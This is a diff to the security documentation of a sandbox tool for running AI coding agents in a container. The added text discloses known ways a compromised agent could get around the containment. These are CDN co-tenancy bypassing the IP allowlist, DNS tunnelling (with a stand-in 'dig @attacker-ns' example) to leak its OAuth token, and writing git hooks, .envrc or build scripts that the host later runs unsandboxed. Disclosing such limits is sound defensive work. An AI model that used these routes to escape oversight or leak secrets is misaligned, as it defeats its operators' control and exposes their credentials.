@@ -155,6 +155,12 @@ host must be reachable *and* a denied host must not be.
 `claude` on the host is a lock-aware guard: it warns if an airlock session for the same
 project is already open (two live sessions can corrupt shared `--resume` history).
 
+For **secrets, prefer the `pass:PATH` form** (`airlock secret set KEY pass:mcp/foo`) over a
+literal value. A literal is stored plaintext in the host state dir (mode 600) and also
+lands in your shell history when you type it; `pass:PATH` keeps the secret encrypted at
+rest and is only resolved — into the mode-0600 env-file, never the command line — at
+launch.
+
 ## Per-project config — `<project>/.airlock/config`
 
 Committed with the project, **safe-parsed** (never sourced) since the project dir is
@@ -209,22 +215,60 @@ Claude only *follows* the convention if told to. The box is briefed automaticall
   host-approved. Enforced by an in-container iptables/ipset default-DROP firewall, on
   **both IPv4 and IPv6** — a single unfiltered address family is a total bypass, so if
   the box has a global v6 address it cannot filter, it refuses to start.
+- **The allowlist matches destination IPs, not names — so it inherits CDN co-tenancy.**
+  The firewall resolves each allowed domain to its IPs and permits TCP/443 to those IPs;
+  it does not (and at that layer cannot) inspect the TLS SNI. So **any** site that resolves
+  to an IP already on the allowlist is reachable, approved or not. This matters most when
+  you open a registry group: npm and PyPI front through large shared CDNs, so
+  `airlock egress dev` effectively allows a slice of that CDN's address space, and an agent
+  can reach an attacker's service co-hosted on the same edge IP. Prefer keeping projects
+  `minimal` and adding narrow `egress =` domains over flipping the whole `dev` group on.
+  Closing this fully would require an SNI-aware filtering proxy (a possible future
+  direction); today, treat an enabled registry group as a broad, if legitimate-looking,
+  exfil surface.
 - **DNS is pinned to the box's configured resolvers**, not open to the internet. This
   narrows, and does not close, DNS exfiltration: the agent can no longer point queries at
   a server it chooses (`dig @attacker-ns …`), but data can still be tunnelled as query
   *names* through your legitimate resolver to a hostile authoritative server. No resolver
-  allowlist can prevent that. Treat DNS as a low-bandwidth channel that remains open.
+  allowlist can prevent that. Treat DNS as a low-bandwidth channel that remains open — and
+  note that the box's own `CLAUDE_CODE_OAUTH_TOKEN` is in scope for it: a compromised box
+  can read its own token and drip it out this way. If you believe a box was compromised,
+  rotate the token (`command claude setup-token` again, then re-save it). The token grants
+  subscription API access, not host or billing access, so the blast radius is bounded.
 - **Host-controlled, tamper-proof grants.** Secrets, share approvals, and egress posture
   live in a per-project state dir that is **never mounted into the box**. A compromised
   session can request more (via the box-writable `.airlock/config`) but can't approve it
   — approving read never grants write; widening always prompts on the host.
 - **Least-privilege container.** Drops all Linux capabilities except the few the firewall
-  and privilege-drop need; runs as non-root `dev`; `--security-opt=no-new-privileges`.
-- **No mounted credentials.** Auth is an OAuth token env var; the host `~/.claude`
-  credentials, docker socket, and other projects are never exposed.
+  and privilege-drop need; runs as non-root `dev`; `--security-opt=no-new-privileges`. A
+  process-count cap (`AIRLOCK_PIDS_LIMIT`, default 4096) guards against a fork-bomb, and an
+  optional RAM ceiling (`AIRLOCK_MEMORY`) can be set per host.
+- **No mounted credentials, and secrets stay off the process table.** Auth is an OAuth
+  token; the host `~/.claude` credentials, container socket, and other projects are never
+  exposed. The token and any injected secrets are handed to the engine via a mode-0600
+  `--env-file` (removed on exit), **not** as `-e KEY=VALUE` — so they don't sit in the host
+  process table (`ps auxe`, `/proc/<pid>/cmdline`) for the life of the container.
 - **Optional private CA chain** (see below) is trusted by *external tooling*
   (curl/git/Python) only — never added to Node's trust, so Claude's own TLS to
   `api.anthropic.com` stays on its vetted built-in roots.
+
+### Known limitation: a workspace the box has touched runs on the host
+
+The firewall contains the *network*. It does nothing about files. Your project is mounted
+**read-write at its real path** (that's the point — the box does real work), so the box can
+write any file the host will later execute **itself, unsandboxed, with your real
+credentials**:
+
+- `.git/hooks/*` — run on your next host `git commit` / `push` / `merge`
+- `.envrc` — run by direnv the next time you `cd` in
+- `Makefile`, `package.json` scripts, `pyproject.toml` / `setup.py`, `conftest.py`,
+  `.vscode/tasks.json`, pre-commit configs, `node_modules/.bin` shims …
+
+None of these touch the network, so containment never sees them. This is the same class as
+the memory channel below, just broader: **treat a repo a box has worked in the way you'd
+treat a PR from a stranger** — review it before you build, commit, or `cd` into it on the
+host with direnv active. Running untrusted code? Do it in the box, and don't run host-side
+build/commit tooling in that tree until you've looked at the diff.
 
 ### Known limitation: shared memory is an influence channel
 
